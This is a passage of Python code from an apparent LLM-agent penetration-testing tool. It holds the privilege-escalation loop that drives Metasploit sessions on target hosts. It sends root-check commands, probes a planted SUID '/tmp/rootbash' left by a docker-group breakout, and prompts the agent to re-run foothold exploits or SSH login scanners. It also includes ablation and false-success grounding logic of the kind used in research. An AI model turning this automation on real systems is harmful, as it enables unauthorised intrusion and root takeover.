            # else: incomplete -> drop the AIMessage AND its partial responses.
            i = j
            continue
        if isinstance(msg, ToolMessage):
            # Orphaned ToolMessage not consumed by a kept AIMessage above -> drop.
            i += 1
            continue
        result.append(msg)
        i += 1

    return result


def _collect_grounded_tool_outputs(turn_msgs: List[BaseMessage], limit: int = 3) -> str:
    """Collect the last `limit` raw ToolMessage contents (each capped at 500
    chars) from the current executor turn, for use as grounded evidence."""
    tool_outputs = []
    for msg in reversed(turn_msgs):
        if isinstance(msg, ToolMessage):
            content = (msg.content or "")
            if len(content) > 500:
                content = content[:500] + "... [truncated]"
            tool_outputs.append(content)
            if len(tool_outputs) >= limit:
                break
    if not tool_outputs:
        return ""
    tool_outputs.reverse()
    return "\n---\n".join(tool_outputs)


def _resolve_live_session_id(state: PrivEscState) -> str:
    """Resolve the session id the critic should run its ground-truth `id` check
    against. The `session_id` in state can be stale or empty (e.g. SESSION_DEAD
    recovery entered the graph with session_id=''), while the enumerator/executor
    may have discovered/recovered a different live session. Resolution order:

    1. state['session_id'] if non-empty (the normal case).
    2. The session_id last passed to tool_session_command by an executor/
       enumerator AIMessage tool call (the session actually being driven).
    3. A live session matching the target IP via session.list (reuse the same
       matching logic as run_privesc), else a lone live shell session.
    """
    sid = str(state.get("session_id", "") or "")
    if sid:
        return sid

    # 2. Last tool_session_command session_id from the message history.
    for msg in reversed(state.get("messages", [])):
        if isinstance(msg, AIMessage) and getattr(msg, "tool_calls", None):
            for tc in msg.tool_calls:
                if tc.get("name") == "tool_session_command":
                    args = tc.get("args", {}) or {}
                    cand = str(args.get("session_id", "") or "")
                    if cand:
                        return cand

    # 3. Live session.list match against the target IP.
    target_ip = str(state.get("target_ip", "") or "")
    try:
        sl = msf_session.client.call("session.list") or {}
    except Exception:
        sl = {}
    if not isinstance(sl, dict) or not sl:
        return ""
    bare_ip = target_ip.split(":")[0] if target_ip else ""
    try:
        for sid_key, sdata in sl.items():
            conn = _session_conn_str(sdata)
            conn_bare = conn.split(":")[0] if conn else conn
            if bare_ip and (bare_ip in conn or bare_ip == conn_bare):
                return str(sid_key)
        # No IP match — accept a lone live shell session.
        shell_sids = [str(k) for k, v in sl.items() if _is_shell_session(v)]
        if len(shell_sids) == 1:
            return shell_sids[0]
        if len(shell_sids) > 1:
            numeric = [s for s in shell_sids if s.isdigit()]
            return max(numeric, key=int) if numeric else shell_sids[-1]
    except Exception:
        return ""
    return ""


# Module-level helpers reused by _resolve_live_session_id (defined here so the
# critic's session resolution does not depend on the closures inside run_privesc).
def _decode_session_val(v):
    if isinstance(v, bytes):
        return v.decode("utf-8", errors="ignore")
    return v if v is not None else ""


def _session_conn_str(sdata: dict) -> str:
    parts = []
    for k in (b"tunnel_peer", "tunnel_peer", b"session_host", "session_host",
              b"target_host", "target_host", b"tunnel_local", "tunnel_local"):
        if isinstance(sdata, dict) and k in sdata:
            parts.append(_decode_session_val(sdata.get(k)))
    return " ".join(str(p) for p in parts)


def _is_shell_session(sdata: dict) -> bool:
    if not isinstance(sdata, dict):
        return False
    for k in (b"type", "type"):
        if k in sdata:
            t = _decode_session_val(sdata.get(k)).lower()
            if "shell" in t or "meterpreter" in t:
                return True
    return not any(k in sdata for k in (b"type", "type"))


# A session "opened" line printed by MSF when an upgrade (sessions -u /
# shell_to_meterpreter) or a local kernel-exploit lands a NEW session.
_OPENED_SESSION_RE = re.compile(
    r"(meterpreter|command shell)\s+session\s+(\d+)\s+opened", re.IGNORECASE)


def _scan_opened_sessions(messages: List[BaseMessage]) -> List[tuple]:
    """Return [(session_id, session_type), ...] for every 'X session N opened'
    line in the privesc message history, NEWEST FIRST. These are sessions created
    DURING privesc — a command_shell->meterpreter upgrade or a kernel-exploit
    session — i.e. the ones a successful escalation actually lands on. The
    ORIGINAL session id lives in state['session_id'] (prose in the init message),
    never in a ToolMessage, so it is never matched here."""
    found = []
    for msg in messages:
        content = getattr(msg, "content", "") or ""
        if not content:
            continue
        for m in _OPENED_SESSION_RE.finditer(content):
            stype = "meterpreter" if "meterpreter" in m.group(1).lower() else "command_shell"
            found.append((m.group(2), stype))
    found.reverse()  # newest first
    return found


def _live_session_ids():
    """Set of live session id strings from session.list, or None if the RPC is
    unavailable (so callers can fall back rather than treat 'unknown' as 'dead')."""
    try:
        sl = msf_session.client.call("session.list") or {}
    except Exception:
        return None
    if not isinstance(sl, dict):
        return None
    return {str(k) for k in sl.keys()}


def _resolve_final_session(state: PrivEscState) -> tuple:
    """Resolve the (session_id, session_type) a privesc result actually lands on.

    Prefers the NEWEST live session opened during privesc (a meterpreter upgrade
    or a kernel-exploit session) over the original command_shell in state, because
    the kernel path roots a NEW session while state['session_id'] still points at
    the pre-upgrade shell. Falls back to the original session when no upgrade
    happened (the common case → behaviour unchanged)."""
    messages = state.get("messages", []) or []
    opened = _scan_opened_sessions(messages)
    if opened:
        live = _live_session_ids()
        for sid, stype in opened:
            if live is None or sid in live:
                return sid, stype
    sid = str(state.get("session_id", "") or "")
    if sid:
        return sid, str(state.get("session_type", "") or "command_shell")
    # No session in state (e.g. SESSION_DEAD recovery). Reuse the legacy live
    # resolver, which scans tool_session_command ids + session.list.
    legacy = _resolve_live_session_id(state)
    return (legacy, "") if legacy else ("", "")


def _direct_priv_check(sid: str, timeout: int = 15) -> str:
    """Run a SESSION-TYPE-APPROPRIATE ground-truth privilege check and return the
    raw output, prefixed with the session type so the critic knows how to read it.

    A command_shell takes `id` (root => uid=0(root)). A meterpreter session does
    NOT understand `id` (it returns 'Unknown command: id'); its native privilege
    probe is `getuid` (root => 'Server username: root'). Sending `id` to a rooted
    meterpreter session would otherwise make the critic falsely FAIL — the exact
    blind spot the kernel path hits, since the kernel exploit lands on meterpreter.
    Retries once on an empty/preamble-only first read (shell reads can chunk)."""
    stype = ""
    try:
        st = msf_session.get_session_type(sid)
        if isinstance(st, bytes):
            st = st.decode("utf-8", errors="ignore")
        stype = (st or "").lower()
    except Exception:
        stype = ""

    cmd = "getuid" if "meterpreter" in stype else "id"
    label = "meterpreter getuid" if "meterpreter" in stype else "command_shell id"
    out = _session_command_capped(sid, cmd, timeout=timeout)
    if (not str(out).strip()) or str(out).strip() in ("(no output)",):
        time.sleep(2)
        out = _session_command_capped(sid, cmd, timeout=timeout)
    return f"[{label}] {out}"


def _docker_root_probe(sid: str, timeout: int = 15) -> str:
    """Docker-group ground-truth probe. A docker-group breakout does NOT change
    the session's own uid — a bare `id` still shows the low-priv user — so the
    normal _direct_priv_check would falsely FAIL a successful breakout. Instead we
    probe the root-owned artifacts a correct breakout plants on the HOST:
      - `/tmp/rootbash -p -c id` — the SUID-root bash the container copied out;
        `bash -p` keeps euid=0 so `id` reports `euid=0(root)` (real root).
    Returns the raw probe output prefixed with a label. Non-interactive (`-c`),
    so it never hangs the command_shell."""
    if not sid:
        return "[docker rootbash probe] (no session_id)"
    out = _session_command_capped(sid, "/tmp/rootbash -p -c 'id' 2>&1", timeout=timeout)
    if (not str(out).strip()) or str(out).strip() in ("(no output)",):
        time.sleep(2)
        out = _session_command_capped(sid, "/tmp/rootbash -p -c 'id' 2>&1", timeout=timeout)
    return f"[docker rootbash probe] {out}"


def critic_node(state: PrivEscState) -> dict:
    """3-way evaluation of privesc attempt."""
    current_step = state.get("loop_step", 0)
    print_colored("\n[PrivEsc Critic] Evaluating...", Colors.HEADER)

    # Independent ground-truth check: the critic must NOT trust the executor's
    # prose summary alone (a hallucinating executor can claim 'whoami returned
    # root' while the real output is 'vagrant' or an error). Run `id` directly
    # on the target under a hard wall-clock cap and feed the RAW output to the
    # critic LLM as authoritative evidence.
    #
    # Use the LIVE session the executor actually drove, not the (possibly stale
    # or empty) session_id from state. When SESSION_DEAD recovery ran, state's
    # session_id is '' and the direct check would be meaningless; resolving the
    # recovered session lets the critic's ground-truth `id` reach the real shell.
    direct_id = ""
    if not eval_flags.grounding_enabled():
        # Ablation V3 (-grounding): skip the independent uid=0 re-check. The
        # critic must judge escalation from the executor's PROSE alone — a
        # hallucinated "id showed uid=0" now goes unchallenged, so false-success
        # is expected to spike.
        direct_id = "(grounding ablation active: no independent ground-truth check performed)"
        print_colored("[PrivEsc Critic] GROUNDING DISABLED (ablation V3) — prose-only verdict", Colors.WARNING)
    else:
        # Resolve against the session privesc actually landed on — after a
        # command_shell->meterpreter upgrade or a kernel exploit that opened a new
        # root session, that is NOT state['session_id']. _direct_priv_check then
        # issues the right probe for the session type (id vs getuid).
        sid = _resolve_final_session(state)[0]
        if sid:
            direct_id = _direct_priv_check(sid, timeout=15)
            # Docker-group breakout special case: the breakout roots the HOST FS
            # via a container but leaves the session's OWN uid unchanged, so the
            # bare `id` above shows the low-priv user even on success. When the
            # attempted technique was docker, ALSO probe the root-owned SUID
            # rootbash the breakout plants, and treat euid=0 there as authoritative
            # root proof. Without this, a correct docker breakout would falsely FAIL.
            plan_and_result = (
                str(state.get("escalation_plan", "")) + " " +
                str(state.get("escalation_result", ""))
            )
            if "uid=0" not in str(direct_id) and _plan_mentions_docker(plan_and_result):
                docker_id = _docker_root_probe(sid, timeout=15)
                direct_id = f"{direct_id}\n{docker_id}"
        else:
            direct_id = "(no live session_id available for a direct check)"
    print_colored(f"[PrivEsc Critic] DIRECT ID CHECK: {str(direct_id)[:200]}", Colors.OKCYAN)

    evidence = (
        f"ENUMERATION RESULTS:\n{state.get('enum_results', '')[:2000]}\n\n"
        f"ESCALATION PLAN:\n{state.get('escalation_plan', '')}\n\n"
        f"EXECUTION RESULT:\n{state.get('escalation_result', '')}\n\n"
        f"DIRECT ID CHECK (authoritative ground-truth, run by the critic just now "
        f"on the target — trust THIS over the execution prose):\n{str(direct_id)[:600]}\n\n"
        f"LOOP STEP: {current_step} of {MAX_PRIVESC_RETRIES}\n"
    )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )

    verdict_text = response.content.strip()
    print_colored(f"[PrivEsc Critic] {verdict_text[:300]}", Colors.OKCYAN)

    new_step = current_step + 1

    # Extract verdict
    upper = verdict_text.upper()
    # Require the exact verdict prefix the prompt instructs the LLM to emit.
    # The loose "PASS not FAIL" fallback caused false positives (e.g. "PASS the
    # escalation to planner") and is intentionally dropped.
    if "VERDICT: PASS" in upper:
        verdict = "PASS"
    elif "FAIL_ENUM" in upper:
        verdict = "FAIL_ENUM"
    elif "FAIL_TECHNIQUE" in upper:
        verdict = "FAIL_TECHNIQUE"
    elif "FAIL_EXEC" in upper:
        verdict = "FAIL_EXEC"
    else:
        verdict = "FAIL_TECHNIQUE"  # Safe default

    print_colored(f"[PrivEsc Critic] Verdict: {verdict}",
                  Colors.OKGREEN if verdict == "PASS" else Colors.FAIL)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[PrivEsc Critic] PASS — {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": "PASS",
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {verdict_text}")],
            "loop_step": new_step,
            "critic_verdict": verdict,
        }


# =============================================================================
# TOOL NODES
# =============================================================================

def enum_tools_node(state: PrivEscState) -> dict:
    tool_node = ToolNode(ENUM_TOOLS)
    return tool_node.invoke(state)

def planner_tools_node(state: PrivEscState) -> dict:
    tool_node = ToolNode(PLANNER_TOOLS)
    return tool_node.invoke(state)

def executor_tools_node(state: PrivEscState) -> dict:
    tool_node = ToolNode(EXECUTOR_TOOLS)
    return tool_node.invoke(state)

# =============================================================================
# ROUTING LOGIC
# =============================================================================

def route_after_enumerator(state: PrivEscState) -> Literal["enum_tools", "planner"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if isinstance(m, HumanMessage):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_ENUM_TOOL_CALLS:
            return "planner"
        return "enum_tools"
    return "planner"


def route_after_planner(state: PrivEscState) -> Literal["planner_tools", "executor"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if (isinstance(m, AIMessage) and "[PrivEsc Enumerator]" in (m.content or "")) or \
               (isinstance(m, HumanMessage) and "CRITIC FEEDBACK" in (m.content or "")):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_PLANNER_TOOL_CALLS:
            return "executor"
        return "planner_tools"
    return "executor"


def route_after_executor(state: PrivEscState) -> Literal["executor_tools", "critic"]:
    last_msg = state["messages"][-1]
    if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
        tool_count = 0
        for m in reversed(state["messages"]):
            if (isinstance(m, AIMessage) and "[PrivEsc Planner]" in (m.content or "")) or \
               (isinstance(m, HumanMessage) and "CRITIC FEEDBACK" in (m.content or "")):
                break
            if isinstance(m, ToolMessage):
                tool_count += 1
        if tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "critic"
        return "executor_tools"
    return "critic"


def _count_consecutive_fail_exec(messages: List[BaseMessage]) -> int:
    """Count how many consecutive critic verdicts (most recent backwards) were
    FAIL_EXEC, stopping at the first non-FAIL_EXEC critic feedback or PASS. Used
    to break identical-action executor loops by forcing a technique switch."""
    count = 0
    for msg in reversed(messages):
        content = getattr(msg, "content", "") or ""
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in content:
            if "FAIL_EXEC" in content.upper():
                count += 1
            else:
                break  # a different verdict resets the streak
        elif isinstance(msg, AIMessage) and "[PrivEsc Critic] PASS" in content:
            break
    return count


def route_after_critic(state: PrivEscState) -> Literal["enumerator", "planner", "executor", "__end__"]:
    time.sleep(2)
    current_step = state.get("loop_step", 0)
    if current_step >= MAX_PRIVESC_RETRIES:
        print_colored("--- MAX PRIVESC RETRIES REACHED ---", Colors.FAIL)
        return END
    verdict = state.get("critic_verdict", "FAIL_TECHNIQUE")
    if verdict == "PASS":
        return END
    elif verdict == "FAIL_ENUM":
        return "enumerator"
    elif verdict == "FAIL_TECHNIQUE":
        return "planner"
    elif verdict == "FAIL_EXEC":
        # Defect #7: guard against identical-action FAIL_EXEC → executor loops.
        # The current verdict's CRITIC FEEDBACK is already in messages, so a
        # count >= 2 means this is at least the 2nd consecutive FAIL_EXEC.
        if _count_consecutive_fail_exec(state["messages"]) >= 2:
            print_colored(
                "[PrivEsc] 2+ consecutive FAIL_EXEC — forcing a technique switch "
                "(routing to planner instead of re-running the same commands).",
                Colors.WARNING,
            )
            return "planner"
        return "executor"
    else:
        return "planner"

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    workflow = StateGraph(PrivEscState)

    workflow.add_node("enumerator", enumerator_node)
    workflow.add_node("enum_tools", enum_tools_node)
    workflow.add_node("planner", planner_node)
    workflow.add_node("planner_tools", planner_tools_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node)
    workflow.add_node("critic", critic_node)

    workflow.set_entry_point("enumerator")

    # Enumerator ReAct loop
    workflow.add_conditional_edges(
        "enumerator", route_after_enumerator,
        {"enum_tools": "enum_tools", "planner": "planner"}
    )
    workflow.add_edge("enum_tools", "enumerator")

    # Planner ReAct loop
    workflow.add_conditional_edges(
        "planner", route_after_planner,
        {"planner_tools": "planner_tools", "executor": "executor"}
    )
    workflow.add_edge("planner_tools", "planner")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor", route_after_executor,
        {"executor_tools": "executor_tools", "critic": "critic"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Critic 3-way routing
    workflow.add_conditional_edges(
        "critic", route_after_critic,
        {
            "enumerator": "enumerator",
            "planner": "planner",
            "executor": "executor",
            END: END,
        }
    )

    return workflow

# =============================================================================
# FINDINGS EXTRACTION
# =============================================================================

def _user_in_docker_group(text: str) -> bool:
    """Deterministic feasibility check for the docker-group vector: True iff the
    given `id`/`groups` enumeration text shows the current user is a member of the
    `docker` group. Membership in `docker` is a near-certain root vector (the
    docker daemon runs as root, so a group member can mount the host FS in a
    container and read/write it as root).

    Matches real `id` output, e.g.
        uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
    as well as `groups` output and the enumerator's `Docker group:` summary line.
    Requires `docker` to appear as a GROUP token — a bare mention of the word
    docker (e.g. "docker.sock", "dockerd running") is NOT sufficient, so a plan
    that merely names a docker *service* is not misread as group membership."""
    if not text:
        return False
    low = text.lower()
    # `id` output: groups=...,999(docker) / gid=999(docker)
    for m in re.finditer(r"(?:groups?|gid|egid)=([^\s]+)", low):
        field = m.group(1)
        # tokens look like 100(users),999(docker) or bare "docker"
        if re.search(r"\bdocker\b", re.sub(r"[(),]", " ", field)):
            return True
    # `groups` command output is a plain space-separated list of names.
    if re.search(r"(?:^|\s)docker(?:\s|$)", low):
        # only trust this outside an obvious path/socket context
        if "docker.sock" not in low and "/docker" not in low:
            return True
    # enumerator summary line, e.g. "Docker group: yes (user in docker group)".
    if re.search(r"docker group\s*:\s*(yes|true|member|present)", low):
        return True
    return False


def _plan_mentions_docker(text: str) -> bool:
    """True iff the escalation plan/result text describes a docker-group breakout
    (used to trigger the docker-specific ground-truth probe in the critic). Keyed
    on `docker` plus a breakout signal so a plan merely naming a docker *service*
    is not misread."""
    if not text:
        return False
    low = text.lower()
    # `rootbash` is the SUID artifact the breakout plants — a strong signal on its
    # own even if the word "docker" was compressed out of the summary.
    if "rootbash" in low:
        return True
    if "docker" not in low:
        return False
    return any(k in low for k in (
        "docker run", "docker group", "docker_group", "docker images",
        "chroot", "docker.sock", "-v /:/", "docker exec",
    ))


def _extract_privesc_findings(state: dict) -> PrivEscFindings:
    critic_verdict = state.get("critic_verdict", "")
    escalation_plan = state.get("escalation_plan", "")
    escalation_result = state.get("escalation_result", "")
    access_level = state.get("access_level", "user")

    success = critic_verdict == "PASS"

    # Extract technique from plan. Fall back to the execution result text when
    # the plan is empty (e.g. enum results fed directly to the executor).
    technique = "unknown"
    plan_lower = (escalation_plan or "").lower()
    if not plan_lower.strip():
        plan_lower = (escalation_result or "").lower()
    # docker-group breakout is checked FIRST: it's the preferred vector on a box
    # whose foothold user is in the docker group, and a plan naming `docker run`/
    # docker-group should classify as docker_group even though its steps may also
    # mention chroot/shadow/etc.
    if "docker" in plan_lower and any(
        k in plan_lower for k in ("docker run", "docker group", "docker images",
                                  "chroot", "docker.sock", "-v /:/", "docker exec")
    ):
        technique = "docker_group"
    elif "sudo" in plan_lower:
        technique = "sudo_miscfg"
    elif "suid" in plan_lower:
        technique = "suid"
    elif "cron" in plan_lower:
        technique = "cron_abuse"
    elif "kernel" in plan_lower:
        technique = "kernel_exploit"
    elif "capabilit" in plan_lower:
        technique = "capabilities"
    elif "path" in plan_lower and "writable" in plan_lower:
        technique = "writable_path"
    elif any(k in plan_lower for k in (
        "post/", "local_exploit_suggester", "metasploit", "meterpreter", "msf"
    )):
        technique = "msf_post"

    previous_level = access_level
    new_level = "root" if success else access_level

    if success:
        summary = f"Escalated from {previous_level} to root via {technique}."
    else:
        summary = f"PrivEsc failed. Attempted: {technique}. {escalation_result[:100] if escalation_result else ''}"

    # Surface the session privesc landed on (the upgraded/root session when the
    # kernel path ran) so the orchestrator can route impact to it.
    final_sid, final_stype = _resolve_final_session(state)

    return PrivEscFindings(
        success=success,
        technique=technique,
        previous_level=previous_level,
        new_level=new_level,
        summary=summary,
        session_id=final_sid,
        session_type=final_stype,
    )

# =============================================================================
# ENTRY POINT
# =============================================================================

def run_privesc(
    target_ip: str,
    session_id: str,
    session_type: str,
    access_level: str,
    os_info: str = "",
    objective: str = "",
    thread_id: str = None,
    recursion_limit: int = 200,
) -> PrivEscFindings:
    import uuid

    # Smart skip: already root
    if access_level == "root":
        print_colored("[PrivEsc] Already root — skipping privilege escalation.", Colors.OKGREEN)
        return PrivEscFindings(
            success=True,
            technique="already_root",
            previous_level="root",
            new_level="root",
            summary="Already had root access. No escalation needed.",
            session_id=str(session_id or ""),
            session_type=session_type or "",
        )

    # Fast-path: passwordless sudo. If the orchestrator already determined the
    # session has sudo rights, try a non-interactive `sudo -n whoami` on the
    # target first. If it returns root we're done — no need to run the full
    # enumeration/planning graph (which otherwise burns retries on a trivially
    # escalatable session).
    if access_level in ("user_with_sudo", "sudo"):
        print_colored(
            f"[PrivEsc] access_level={access_level} — attempting passwordless sudo fast-path.",
            Colors.OKCYAN,
        )
        try:
            quick = _session_command_capped(session_id, "sudo -n whoami", timeout=15)
            # Retry up to 2 more times if the first read is empty or shows only
            # preamble — command_shell sessions often return the real output in a
            # later chunk, and concluding 'no NOPASSWD' from an empty first read
            # would skip a trivially escalatable session.
            attempts = 0
            while attempts < 2 and (
                (not str(quick).strip())
                or str(quick).strip() in ("(no output)",)
                or "root" not in str(quick).lower()
                and not any(
                    s in str(quick).lower()
                    for s in ("not allowed", "password is required", "may not run")
                )
            ):
                time.sleep(3)
                quick = _session_command_capped(session_id, "sudo -n whoami", timeout=15)
                attempts += 1
            quick_str = str(quick).lower()
            # Require 'root' to appear as a standalone whoami result line, not
            # merely as a substring (e.g. '/root/', 'superroot', or an error
            # message that mentions root). This prevents a false-positive
            # fast-path success on a session whose output contains 'root' in a
            # path or error context.
            root_confirmed = any(
                re.fullmatch(r"root", l.strip(), re.IGNORECASE)
                for l in str(quick).splitlines() if l.strip()
            )
            if root_confirmed and "not allowed" not in quick_str \
                    and "password is required" not in quick_str \
                    and "a password is required" not in quick_str:
                print_colored(
                    "[PrivEsc] Passwordless sudo confirmed (NOPASSWD) — escalated to root.",
                    Colors.OKGREEN,
                )
                return PrivEscFindings(
                    success=True,
                    technique="sudo_nopasswd",
                    previous_level=access_level,
                    new_level="root",
                    summary="Escalated via passwordless sudo (NOPASSWD).",
                    session_id=str(session_id or ""),
                    session_type=session_type or "",
                )
            print_colored(
                "[PrivEsc] Fast-path sudo check did not confirm root — falling through to graph.",
                Colors.WARNING,
            )
        except Exception as e:
            print_colored(
                f"[PrivEsc] Fast-path sudo check failed ({e}) — falling through to graph.",
                Colors.WARNING,
            )

    if thread_id is None:
        thread_id = f"privesc_{uuid.uuid4().hex[:8]}"

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    # --- Session health check: verify session is still alive ---
    # Use a DIRECT RPC call (session.list) — instantaneous and authoritative.
    # The old `msf_session.send_command("sessions -l")` routed through the MSF
    # console, which blocks up to the 60s console timeout and returns empty
    # output when the console is busy (e.g. still finishing the exploit that
    # just created this session), causing a FALSE dead-session detection.
    #
    # Runs BEFORE initial_state is built so that if we swap to an alternative
    # session, the new session_id propagates into the graph state.
    def _decode(v):
        if isinstance(v, bytes):
            return v.decode("utf-8", errors="ignore")
        return v if v is not None else ""

    def _session_conn_str(sdata: dict) -> str:
        """Build a best-effort connection/identity string for a session dict so
        we can match it against the target IP. Handles both bytes and str keys
        (msgpack decoding varies)."""
        parts = []
        for k in (b"tunnel_peer", "tunnel_peer", b"session_host", "session_host",
                  b"target_host", "target_host", b"tunnel_local", "tunnel_local"):
            if isinstance(sdata, dict) and k in sdata:
                parts.append(_decode(sdata.get(k)))
        return " ".join(str(p) for p in parts)

    def _is_shell_session(sdata: dict) -> bool:
        """True if a session dict looks like a usable command_shell/meterpreter."""
        if not isinstance(sdata, dict):
            return False
        for k in (b"type", "type"):
            if k in sdata:
                t = _decode(sdata.get(k)).lower()
                if "shell" in t or "meterpreter" in t:
                    return True
        # If 'type' is absent, assume usable (msgpack key may be missing).
        return not any(k in sdata for k in (b"type", "type"))

    sl = {}
    alive = True  # optimistic default if the check itself errors
    try:
        sl = msf_session.client.call("session.list") or {}
        # Defect #2: the orchestrator passes session_id as a string ('5') while
        # msgpack-decoded session.list keys are often ints (5). Match on both the
        # string form AND the int form so a live session is not declared dead.
        sid_is_digit = str(session_id).isdigit()
        alive = any(str(k) == str(session_id) for k in sl) or (
            sid_is_digit and int(session_id) in sl
        )
    except Exception as e:
        print_colored(f"[PrivEsc] Session list check failed: {e}", Colors.WARNING)
        alive = True  # optimistic: proceed and let the graph discover the truth

    session_dead = False  # tracks whether we entered the graph without a known-live session
    if not alive:
        # Defect #1 & #2: before giving up, try progressively wider matching.
        alt_id = None
        try:
            # Pass 1: any session whose connection/identity string mentions the
            # target IP (handle the 'IP:port' tunnel_peer format by also
            # stripping the port and matching the bare IP).
            bare_ip = str(target_ip).split(":")[0] if target_ip else ""
            for sid_key, sdata in sl.items():
                conn = _session_conn_str(sdata)
                conn_bare = conn.split(":")[0] if conn else conn
                if bare_ip and (bare_ip in conn or bare_ip == conn_bare):
                    alt_id = str(sid_key)
                    break
            # Pass 2: if no IP match, accept ANY live shell session. When the
            # session list is small, a lone shell is almost certainly the right
            # foothold (tunnel_peer may be absent or formatted unexpectedly).
            if not alt_id:
                shell_sids = [str(k) for k, v in sl.items() if _is_shell_session(v)]
                if len(shell_sids) == 1:
                    alt_id = shell_sids[0]
                elif len(shell_sids) > 1:
                    # Prefer the highest-numbered (newest) session.
                    numeric = [s for s in shell_sids if s.isdigit()]
                    alt_id = (max(numeric, key=int) if numeric else shell_sids[-1])
        except Exception as e:
            print_colored(f"[PrivEsc] Alternative-session scan failed: {e}", Colors.WARNING)

        if alt_id:
            print_colored(
                f"[PrivEsc] Original session {session_id} not matched; using "
                f"alternative live session {alt_id} for {target_ip}.",
                Colors.WARNING,
            )
            session_id = alt_id  # flows into initial_state below
        else:
            # Defect #1: do NOT hard-abort. Enter the graph with a SESSION_DEAD
            # context so the enumerator first tries to recover/re-open a session
            # (list sessions, re-run the foothold exploit) before escalating.
            # A hard return here burns every orchestrator retry with zero effort.
            session_dead = True
            session_id = ""  # no known-live session
            print_colored(
                f"[PrivEsc] No live session to {target_ip} found — entering graph in "
                f"SESSION_DEAD recovery mode (enumerator will attempt to recover a "
                f"session before escalating).",
                Colors.WARNING,
            )

    if session_dead:
        creds_hint = ""
        # Surface any objective-embedded credentials as a recovery hint.
        if objective and ("password" in objective.lower() or "cred" in objective.lower()):
            creds_hint = f"\nPossible credentials referenced in objective: {objective}"
        init_message = (
            f"Escalate privileges on {target_ip}.\n"
            f"WARNING — SESSION_DEAD: there is currently NO live session to the "
            f"target. Before any escalation you MUST first recover a foothold:\n"
            f"  1. Call tool_metasploit_rpc('sessions') to list all live sessions.\n"
            f"  2. If a session to {target_ip} exists, note its ID and use it for "
            f"all subsequent tool_session_command calls.\n"
            f"  3. If none exists, attempt to re-open one: re-run the original "
            f"foothold exploit via tool_metasploit_rpc (e.g. the service exploit "
            f"that gave initial access), or SSH in with any known credentials via "
            f"tool_metasploit_rpc('use auxiliary/scanner/ssh/ssh_login ...').\n"
            f"  4. Only once a live session exists, proceed with enumeration and "
            f"escalation.\n"
            f"If recovery is impossible after a few attempts, summarize that the "
            f"session could not be recovered.{creds_hint}\n"
            f"Session type (was): {session_type}\n"
            f"Current access: {access_level}\n"
            f"OS: {os_info}\n"
            f"Objective: {objective}"
        )
    else:
        init_message = (
            f"Escalate privileges on {target_ip}.\n"
            f"Session: {session_type} (ID: {session_id})\n"
            f"Current access: {access_level}\n"
            f"OS: {os_info}\n"
            f"Objective: {objective}"
        )

    initial_state = {
        "messages": [HumanMessage(content=init_message)],
        "target_ip": target_ip,
        "session_id": session_id,
        "session_type": session_type,
        "access_level": access_level,
        "os_info": os_info,
        "objective": objective,
        "enum_results": "",
        "escalation_plan": "",
        "escalation_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_privesc] Starting privilege escalation subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_ip}", Colors.HEADER)
    print_colored(f"  Session: {session_type} #{session_id}", Colors.HEADER)
    print_colored(f"  Current access: {access_level}", Colors.HEADER)
    print_colored(f"  OS: {os_info}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    _start = time.time()
    _timed_out = False
    try:
        for event in app.stream(initial_state, config=config):
            if time.time() - _start > PRIVESC_WALLCLOCK_TIMEOUT:
                print_colored(
                    f"\n[PrivEsc] TIME-BOX hit ({PRIVESC_WALLCLOCK_TIMEOUT}s) — "
                    f"stopping escalation, returning best-effort findings.",
                    Colors.WARNING)
                _timed_out = True
                break
            for key, value in event.items():
                if not value or "messages" not in value:
                    continue
                msgs = value["messages"]
                if not isinstance(msgs, list):
                    msgs = [msgs]
                for msg in msgs:
                    if not isinstance(msg, BaseMessage) or not msg.content:
                        continue
                    if "CRITIC FEEDBACK" in msg.content:
                        print_colored(f"\n{msg.content}", Colors.FAIL)
                    elif isinstance(msg, ToolMessage):
                        display = msg.content[:500]
                        if len(msg.content) > 500:
                            display += "... [truncated]"
                        print(f"\n[Tool Output]: {display}")
                    elif isinstance(msg, AIMessage):
                        content = msg.content
                        if "[PrivEsc Enumerator]" in content:
                            print_colored(f"\n{content[:400]}", Colors.HEADER)
                        elif "[PrivEsc Planner]" in content:
                            print_colored(f"\n{content[:400]}", Colors.OKBLUE)
                        elif "[PrivEsc Critic]" in content:
                            color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
                            print_colored(f"\n{content[:400]}", color)
                        else:
                            print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)

                    if hasattr(msg, "tool_calls") and msg.tool_calls:
                        for t in msg.tool_calls:
                            print_colored(
                                f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
                                Colors.OKCYAN
                            )
    except Exception as e:
        print_colored(f"\n[PrivEsc] Subgraph crashed: {e}", Colors.FAIL)
        print_colored("[PrivEsc] Returning graceful failure.", Colors.WARNING)
